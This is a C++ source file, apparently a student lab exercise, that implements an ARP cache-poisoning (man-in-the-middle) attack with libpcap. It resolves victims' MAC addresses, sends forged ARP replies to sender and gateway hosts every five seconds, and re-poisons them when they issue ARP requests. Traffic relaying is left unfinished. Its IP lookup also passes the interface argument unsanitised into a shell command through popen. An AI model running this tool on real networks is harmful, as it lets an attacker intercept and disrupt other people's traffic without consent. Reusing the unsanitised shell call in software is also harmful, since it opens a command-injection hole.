#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <vector>
#include <thread>
#include <chrono>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <array>
#include <memory>
#include <stdexcept>
#include <cstdio>

struct ArpPacket {
    struct ether_header eth;
    struct ether_arp arp;
};

struct IPPair {
    std::string senderIP;
    std::string targetIP;
};

// 네트워크 인터페이스의 MAC 주소를 얻는 함수
bool getMyMacAddress(const std::string& interface, uint8_t* mac) {
    std::string path = "/sys/class/net/" + interface + "/address";
    std::ifstream macFile(path);
    if (!macFile) {
        std::cerr << "Failed to open " << path << std::endl;
        return false;
    }

    std::string macStr;
    macFile >> macStr;

    // MAC 주소 형식 검증 (XX:XX:XX:XX:XX:XX)
    if (macStr.length() != 17) {  
        std::cerr << "Invalid MAC address format" << std::endl;
        return false;
    }

    // 문자열 MAC 주소를 바이트 배열로 변환
    for (int i = 0; i < 6; i++) {
        mac[i] = std::stoi(macStr.substr(i*3, 2), nullptr, 16);
    }

    return true;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

bool getMyIPAddress(const std::string& interface, char* ip) {
    std::string cmd = "ip addr show " + interface + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f1";
    
    try {
        std::string result = exec(cmd.c_str());
        if (!result.empty()) {
            // 결과에서 개행문자 제거
            if (result[result.length()-1] == '\n') {
                result.erase(result.length()-1);
            }
            strncpy(ip, result.c_str(), INET_ADDRSTRLEN);
            return true;
        }
    } catch (const std::runtime_error& e) {
        std::cerr << "Error executing command: " << e.what() << std::endl;
    }

    std::cerr << "Failed to find IP address for interface " << interface << std::endl;
    return false;
}

// ARP 패킷 생성 및 전송
void sendArpPacket(pcap_t* handle, const uint8_t* srcMac, const uint8_t* dstMac, 
                   uint16_t opcode, const uint8_t* senderMac, const char* senderIp, 
                   const uint8_t* targetMac, const char* targetIp) {
    ArpPacket packet;
    
    // 이더넷 헤더
    memcpy(packet.eth.ether_dhost, dstMac, 6);
    memcpy(packet.eth.ether_shost, srcMac, 6);
    packet.eth.ether_type = htons(ETHERTYPE_ARP);
    
    // ARP 헤더
    packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // hardware type = Ethernet
    packet.arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP); // protocol type = IPv4
    packet.arp.ea_hdr.ar_hln = 6;                   // Mac 주소 길이
    packet.arp.ea_hdr.ar_pln = 4;                   // Ip 주소 길이
    packet.arp.ea_hdr.ar_op = htons(opcode);        // ARP Request or ARP Reply
    
    memcpy(packet.arp.arp_sha, senderMac, 6);
    inet_pton(AF_INET, senderIp, packet.arp.arp_spa); // AF_INET = Ipv4, change string(senderIp) to binary(arp_spa)
    memcpy(packet.arp.arp_tha, targetMac, 6);
    inet_pton(AF_INET, targetIp, packet.arp.arp_tpa); // AF_INET = Ipv4, change string(targetIp) to binary(arp_tpa)
    
    pcap_sendpacket(handle, (const u_char*)&packet, sizeof(ArpPacket));
}

// 지정된 IP 주소의 MAC 주소를 얻는 함수
void getMacAddress(pcap_t* handle, const uint8_t* srcMac, const char* srcIp, const char* targetIp, uint8_t* macResult) {
    uint8_t broadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    // ARP 요청 패킷 전송
    sendArpPacket(handle, srcMac, broadcastMac, ARPOP_REQUEST, srcMac, srcIp, broadcastMac, targetIp);
    
    struct pcap_pkthdr* header;
    const u_char* packet;
    while (pcap_next_ex(handle, &header, &packet) >= 0) {
        ArpPacket* arpPacket = (ArpPacket*)packet;
        if (ntohs(arpPacket->eth.ether_type) == ETHERTYPE_ARP &&
            ntohs(arpPacket->arp.ea_hdr.ar_op) == ARPOP_REPLY) {
            char replyIp[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arpPacket->arp.arp_spa, replyIp, INET_ADDRSTRLEN);
            if (strcmp(replyIp, targetIp) == 0) {
                memcpy(macResult, arpPacket->arp.arp_sha, 6);
                return;
            }
        }
    }
}

// 주기적으로 ARP 스푸핑 패킷을 전송
void periodicArpSpoof(pcap_t* handle, const uint8_t* attackerMac, const std::vector<IPPair>& ipPairs, 
                      const std::vector<uint8_t*>& senderMacs, const std::vector<uint8_t*>& targetMacs) {
    while (true) {
        for (size_t i = 0; i < ipPairs.size(); ++i) {
            // sender에게 위조된 ARP 응답 전송
            sendArpPacket(handle, attackerMac, senderMacs[i], ARPOP_REPLY, attackerMac, 
                          ipPairs[i].targetIP.c_str(), senderMacs[i], ipPairs[i].senderIP.c_str());
            // 게이트웨이에게 위조된 ARP 응답 전송
            sendArpPacket(handle, attackerMac, targetMacs[i], ARPOP_REPLY, attackerMac, 
                          ipPairs[i].senderIP.c_str(), targetMacs[i], ipPairs[i].targetIP.c_str());
        }
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        std::cerr << "Usage: " << argv[0] << " <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]" << std::endl;
        return 1;
    }

    // pcap 핸들 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "Couldn't open device " << argv[1] << ": " << errbuf << std::endl;
        return 2;
    }

    uint8_t attackerMac[6];
    char attackerIp[INET_ADDRSTRLEN];

    if (!getMyMacAddress(argv[1], attackerMac)) {
        std::cerr << "Failed to get MAC address" << std::endl;
        return 3;
    }

    if (!getMyIPAddress(argv[1], attackerIp)) {
        std::cerr << "Failed to get IP address" << std::endl;
        return 4;
    }

    std::vector<IPPair> ipPairs;
    std::vector<uint8_t*> senderMacs;
    std::vector<uint8_t*> targetMacs;

    for (int i = 2; i < argc; i += 2) {
        ipPairs.push_back({argv[i], argv[i+1]});
        uint8_t* senderMac = new uint8_t[6];
        uint8_t* targetMac = new uint8_t[6];
        getMacAddress(handle, attackerMac, attackerIp, argv[i], senderMac);
        getMacAddress(handle, attackerMac, attackerIp, argv[i+1], targetMac);
        senderMacs.push_back(senderMac);
        targetMacs.push_back(targetMac);
    }

    // ARP 스푸핑 스레드 시작
    std::thread spoofThread(periodicArpSpoof, handle, attackerMac, ipPairs, senderMacs, targetMacs);
    
    // 패킷 캡처 및 처리 루프
    struct pcap_pkthdr* header;
    const u_char* packet;
    while (pcap_next_ex(handle, &header, &packet) >= 0) {
        struct ether_header* ethHeader = (struct ether_header*)packet;
        
        // 공격자의 MAC 주소로 향하는 패킷 처리
        if (memcmp(ethHeader->ether_dhost, attackerMac, 6) == 0) {
            if (ntohs(ethHeader->ether_type) == ETHERTYPE_ARP) {
                ArpPacket* arpPacket = (ArpPacket*)packet;
                if (ntohs(arpPacket->arp.ea_hdr.ar_op) == ARPOP_REQUEST) {
                    // ARP 요청 패킷 처리
                    char senderIp[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, arpPacket->arp.arp_spa, senderIp, INET_ADDRSTRLEN);
                    char targetIp[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, arpPacket->arp.arp_tpa, targetIp, INET_ADDRSTRLEN);
                    // 스푸핑 대상인 경우 재감염
                    for (const auto& pair : ipPairs) {
                        if (strcmp(senderIp, pair.senderIP.c_str()) == 0 || strcmp(senderIp, pair.targetIP.c_str()) == 0) {
                            std::cout << "ARP request detected. Re-infecting..." << std::endl;
                            sendArpPacket(handle, attackerMac, arpPacket->arp.arp_sha, ARPOP_REPLY, 
                                          attackerMac, targetIp, arpPacket->arp.arp_sha, senderIp);
                            break;
                        }
                    }
                }
            }   // not yet.....
                std::cout << " arp test " << std::endl;
            }
        }

    spoofThread.join();
    pcap_close(handle);

    for (auto mac : senderMacs) delete[] mac;
    for (auto mac : targetMacs) delete[] mac;

    return 0;
}